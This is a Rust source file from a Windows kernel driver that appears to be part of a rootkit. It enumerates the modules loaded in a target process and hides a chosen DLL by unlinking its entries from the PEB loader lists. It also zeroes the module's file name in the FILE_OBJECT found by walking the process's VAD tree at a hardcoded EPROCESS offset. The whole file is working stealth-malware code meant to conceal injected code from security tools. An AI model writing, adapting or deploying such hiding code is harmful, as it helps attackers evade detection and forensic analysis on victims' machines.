use {
    winapi::shared::ntdef::LIST_ENTRY,
    ntapi::{ntldr::LDR_DATA_TABLE_ENTRY, ntpebteb::PEB}, 
    shared::structs::{ModuleInfo, TargetModule, TargetProcess}, 
    wdk_sys::{
        ntddk::IoGetCurrentProcess, 
        FILE_OBJECT, NTSTATUS, POOL_FLAG_NON_PAGED, RTL_BALANCED_NODE, 
        STATUS_INVALID_ADDRESS, STATUS_INVALID_PARAMETER, STATUS_UNSUCCESSFUL, 
        _MODE::KernelMode
    },
    crate::{
        internals::{
            structs::MMVAD_SHORT, vad::MMVAD, 
            externs::{MmCopyVirtualMemory, PsGetProcessPeb}
        }, 
        process::Process, utils::{pool::PoolMemory, process_attach::ProcessAttach}
    }, 
};

pub mod ioctls;

/// Represents a module in the operating system.
pub struct Module;

impl Module {

    /// VAD Type for an image map.
    const VAD_IMAGE_MAP: u32 = 2;

    /// Enumerates modules in a given target process.
    /// 
    /// # Parameters
    /// 
    /// - `process`: A pointer to the target process (`*mut TargetProcess`) from which the modules will be enumerated.
    /// - `module_info`: A pointer to a `ModuleInfo` structure that will be populated with information about the enumerated modules.
    /// - `information`: A mutable reference to a `usize` that will store additional information about the module enumeration.
    ///
    /// # Returns
    /// 
    /// - `NTSTATUS`: Returns `STATUS_SUCCESS` if the module enumeration is successful, otherwise returns an appropriate error status.
    ///
    pub unsafe fn enumerate_module(process: *mut TargetProcess, module_info: *mut ModuleInfo, information: &mut usize) -> Result<(), NTSTATUS> {
        log::info!("Starting module enumeration");
         
        let pid = (*process).pid;
        let temp_info_size =  256 * core::mem::size_of::<ModuleInfo>();

        // Allocates memory for temporarily storing module information
        let temp_info = PoolMemory::new(POOL_FLAG_NON_PAGED, temp_info_size as u64, u32::from_be_bytes(*b"btrd"))
            .map(|mem| mem.ptr as *mut ModuleInfo)
            .ok_or_else(|| {
                log::error!("PoolMemory (Module) Failed");
                STATUS_UNSUCCESSFUL
            })?;

        // Attaches the target process to the current context
        let target = Process::new(pid).ok_or(STATUS_UNSUCCESSFUL)?;
        let mut attach_process = ProcessAttach::new(target.e_process);

        // Gets the PEB (Process Environment Block) of the target process
        let target_peb = PsGetProcessPeb(target.e_process) as *mut PEB;
        if target_peb.is_null() || (*target_peb).Ldr.is_null() {
            return Err(STATUS_INVALID_PARAMETER);
        }

        // Enumerates the loaded modules from the InLoadOrderModuleList
        let current = &mut (*(*target_peb).Ldr).InLoadOrderModuleList as *mut LIST_ENTRY;
        let mut next = (*(*target_peb).Ldr).InLoadOrderModuleList.Flink;
        let mut count = 0;         

        while next != current  {
            if next.is_null() {
                log::error!("Next LIST_ENTRY is null");
                return Err(STATUS_UNSUCCESSFUL);
            }

            let list_entry = next as *mut LDR_DATA_TABLE_ENTRY;
            if list_entry.is_null() {
                log::error!("LDR_DATA_TABLE_ENTRY is null");
                return Err(STATUS_UNSUCCESSFUL);
            }

            // Retrieves the full module name
            let buffer = core::slice::from_raw_parts((*list_entry).FullDllName.Buffer, ((*list_entry).FullDllName.Length / 2) as usize);
            if buffer.is_empty() {
                log::error!("Buffer for module name is empty");
                return Err(STATUS_UNSUCCESSFUL);
            }

            // Populates the `ModuleInfo` structure with name, address, and index
            let name = &mut (*temp_info.offset(count)).name.as_mut();
            core::ptr::copy_nonoverlapping(buffer.as_ptr(), name.as_mut_ptr(), buffer.len());
            (*temp_info.offset(count)).address = (*list_entry).DllBase as usize;
            (*temp_info.offset(count)).index = count as u8;
            
            count += 1;
    
            next = (*next).Flink;
        }

        // Detaches the target process
        attach_process.detach();
    
        // Copies module information to the caller's space
        let size_to_copy = count as usize * core::mem::size_of::<ModuleInfo>();
        let mut return_size = 0;
        MmCopyVirtualMemory(
            IoGetCurrentProcess(),
            temp_info as *mut _,
            IoGetCurrentProcess(),
            module_info as *mut _,
            size_to_copy as u64,
            KernelMode as i8,
            &mut return_size,
        );

        *information = count as usize * core::mem::size_of::<ModuleInfo>();

        Ok(())
    }

    /// Hides a module in a target process by removing its entries from the module list.
    ///
    /// # Parameters
    /// 
    /// - `target`: A pointer to a `TargetModule` structure containing information about the module to be hidden.
    ///
    /// # Returns
    /// 
    /// - `NTSTATUS`: Returns `STATUS_SUCCESS` if the module is successfully hidden, otherwise returns an appropriate error status.
    ///
    pub unsafe fn hide_module(target: *mut TargetModule) -> Result<(), NTSTATUS> {
        let pid = (*target).pid;
        let module_name = &(*target).module_name.to_lowercase();
        let target = Process::new(pid).ok_or(STATUS_UNSUCCESSFUL)?;
        let mut attach_process = ProcessAttach::new(target.e_process);

        let target_peb = PsGetProcessPeb(target.e_process) as *mut PEB;
        if target_peb.is_null() || (*target_peb).Ldr.is_null() {
            return Err(STATUS_INVALID_PARAMETER);
        }
        
        let current = &mut (*(*target_peb).Ldr).InLoadOrderModuleList as *mut LIST_ENTRY;
        let mut next = (*(*target_peb).Ldr).InLoadOrderModuleList.Flink;
        let mut address = core::ptr::null_mut();

        while next != current {
            if next.is_null() {
                log::error!("Next LIST_ENTRY is null");
                return Err(STATUS_UNSUCCESSFUL);
            }

            let list_entry = next as *mut LDR_DATA_TABLE_ENTRY;
            if list_entry.is_null() {
                log::error!("LDR_DATA_TABLE_ENTRY is null");
                return Err(STATUS_UNSUCCESSFUL);
            }

            let buffer = core::slice::from_raw_parts((*list_entry).FullDllName.Buffer, ((*list_entry).FullDllName.Length / 2) as usize);
            if buffer.is_empty() {
                log::error!("Buffer for module name is empty");
                return Err(STATUS_UNSUCCESSFUL);
            }

            let dll_name = alloc::string::String::from_utf16_lossy(buffer);    
            if module_name.contains(&dll_name.to_lowercase()) {
                // Removes the module from the load order list
                Self::remove_link(&mut (*list_entry).InLoadOrderLinks);
                Self::remove_link(&mut (*list_entry).InMemoryOrderLinks);
                Self::remove_link(&mut (*list_entry).u1.InInitializationOrderLinks);
                Self::remove_link(&mut (*list_entry).HashLinks);
                address = (*list_entry).DllBase;
                break;
            }
    
            next = (*next).Flink;
        }
    
        // Detaches the target process
        attach_process.detach();

        if !address.is_null() {
            Self::hide_object(address as u64, target);
        }

        Ok(())
    }

    /// Removing the module name in the FILE_OBJECT structure.
    ///
    /// # Parameters
    /// 
    /// - `target_address`: The address of the module to hide.
    /// - `target_eprocess`: The target process structure.
    ///
    /// # Returns
    /// 
    /// - `NTSTATUS`: Returns `STATUS_SUCCESS` if the VAD is successfully hidden, otherwise returns an appropriate error status.
    ///
    pub unsafe fn hide_object(target_address: u64, target_eprocess: Process) -> Result<(), NTSTATUS> {
        let vad_root = 0x7d8;
        let vad_table = target_eprocess.e_process.cast::<u8>().offset(vad_root) as *mut RTL_BALANCED_NODE;
        let current_node = vad_table;

        // Uses a stack to iteratively traverse the tree
        let mut stack = alloc::vec![vad_table];
            
        while let Some(current_node) = stack.pop() {
            if current_node.is_null() {
                continue;
            }

            // Converts the current node to an MMVAD_SHORT
            let vad_short = current_node as *mut MMVAD_SHORT;

            // Calculates start and end addresses
            let mut start_address = (*vad_short).starting_vpn as u64;
            let mut end_address = (*vad_short).ending_vpn as u64;

            // Uses StartingVpnHigh and EndingVpnHigh to assemble the complete address
            start_address |= ((*vad_short).starting_vpn_high as u64) << 32;
            end_address |= ((*vad_short).ending_vpn_high as u64) << 32;

            // Multiply the addresses by 0x1000 (page size) to get the real addresses
            let start_address = start_address * 0x1000;
            let end_address = end_address * 0x1000;

            if (*vad_short).u.vad_flags.vad_type() == Self::VAD_IMAGE_MAP && target_address >= start_address && target_address <= end_address {
                let long_node = vad_short as *mut MMVAD;

                let subsection = (*long_node).subsection;
                if subsection.is_null() || (*subsection).control_area.is_null() || (*(*subsection).control_area).file_pointer.inner.object.is_null() {
                    return Err(STATUS_INVALID_ADDRESS);
                }

                let file_object = ((*(*subsection).control_area).file_pointer.inner.value & !0xF) as *const FILE_OBJECT;
                let file_name = core::slice::from_raw_parts((*file_object).FileName.Buffer, ((*file_object).FileName.Length / 2) as usize);
                core::ptr::write_bytes((*file_object).FileName.Buffer, 0, (*file_object).FileName.Length as usize);
                break;
            }

            // Stack the right node (if there is one)
            if !(*vad_short).vad_node.__bindgen_anon_1.__bindgen_anon_1.Right.is_null() {
                stack.push((*vad_short).vad_node.__bindgen_anon_1.__bindgen_anon_1.Right);
            }

            // Stack the left node (if there is one)
            if !(*vad_short).vad_node.__bindgen_anon_1.__bindgen_anon_1.Left.is_null() {
                stack.push((*vad_short).vad_node.__bindgen_anon_1.__bindgen_anon_1.Left);
            }
        }

        Ok(())
    }

    /// Removes a link from the list.
    ///
    /// # Parameters
    /// 
    /// - `list`: A mutable reference to the `LIST_ENTRY` structure to unlink.
    /// 
    unsafe fn remove_link(list: &mut LIST_ENTRY) {
        let next = list.Flink;
        let previous = list.Blink;
    
        (*next).Blink = previous;
        (*previous).Flink = next;
    
        list.Flink = list;
        list.Blink = list;
    }

}
